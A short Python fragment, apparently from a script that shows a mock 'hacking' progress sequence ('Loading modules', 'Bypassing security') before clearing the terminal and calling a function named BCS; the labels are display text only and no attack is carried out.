    progress_scan("Loading modules")
    progress_scan("Connecting to servers")
    progress_scan("Bypassing security")
    print()
    time.sleep(0.5)
    os.system("clear")
    BCS()